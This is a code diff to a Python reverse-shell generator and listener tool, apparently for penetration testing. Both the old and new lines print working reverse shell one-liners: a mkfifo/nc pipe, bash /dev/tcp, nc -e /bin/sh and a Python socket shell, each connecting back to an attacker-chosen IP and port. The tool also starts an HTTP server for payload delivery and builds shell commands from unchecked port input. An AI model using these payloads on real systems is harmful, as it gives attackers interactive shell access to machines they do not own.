@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
 from simple_colors import *
-import os, argparse, socket
+import os, argparse, socket, time
 
 ap = argparse.ArgumentParser()
 
@@ -102,13 +102,13 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
         msfvenom = msfvenom.replace('x64', 'x86')
 
     if payload == 'oldnc':
-        print(blue('\nYour payload is:\n\n') + red('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + IP + ' ' + PORT + ' >/tmp/f\n'))
+        print(blue('\nYour payload is:\n\n') + red('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + IP + ' ' + PORT + ' >/tmp/f'))
     elif payload == 'bash':
-        print(blue('\nYour payload is:\n\n') + red('bash -i >& /dev/tcp/' + IP + '/' + PORT + ' 0>&1\n'))
+        print(blue('\nYour payload is:\n\n') + red('bash -i >& /dev/tcp/' + IP + '/' + PORT + ' 0>&1'))
     elif payload == 'nc':
-        print(blue('\nYour payload is:\n\n') + red('nc -e /bin/sh ' + IP + ' ' + PORT + '\n'))
+        print(blue('\nYour payload is:\n\n') + red('nc -e /bin/sh ' + IP + ' ' + PORT))
     elif payload == 'python' or payload == '.py':
-        print(blue('\nYour payload is:\n\n') + red("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + IP + "\"," + PORT + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"))
+        print(blue('\nYour payload is:\n\n') + red("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + IP + "\"," + PORT + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"))
     elif payload == 'php' or payload == '.php':
         file = 'autoreverse.php'
         Check_files(file)
@@ -157,7 +157,8 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
 def Check_Port(port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     if s.connect_ex(('127.0.0.1', int(port))) == 0:
-        print(red('The port is already in use.'))
+        process = os.popen('lsof -i -P -n | grep LISTEN | grep ' + port + ' | awk \'{print $1, $2}\'').read().replace('\n', '')
+        print(red('The port is already used by ' + process + '.'))
         exit()
 
 def listeners():
@@ -166,7 +167,7 @@ def listeners():
             Configure()
         else:
             Configure(arch = arch)
-        print(green('Waiting to say I\'m in...\n'))
+        print(green('\nWaiting to say I\'m in...\n'))
         nc_list()
         exit()
     elif args.listener == 'msf' or args.listener == 'metasploit':
@@ -184,7 +185,9 @@ if args.httpserver != None:
     Check_Port(args.httpserver)
     server = 'python3 -m http.server ' + str(args.httpserver) + ' > /tmp/autoreverse.log 2>/dev/null &'
     os.system(server)
-    print(blue('\nHTTP server running on port ' + str(args.httpserver)))
+    time.sleep(0.03)
+    process = os.popen('lsof -i -P -n | grep LISTEN | grep ' + str(args.httpserver) + ' | awk \'{print $1, $2}\'').read().replace('\n', '')
+    print(blue('\nHTTP server running on port ' + str(args.httpserver) + '. (Process: ' + process + ').'))
 if args.listener != None:
     Check_Port(args.port)
     listeners()
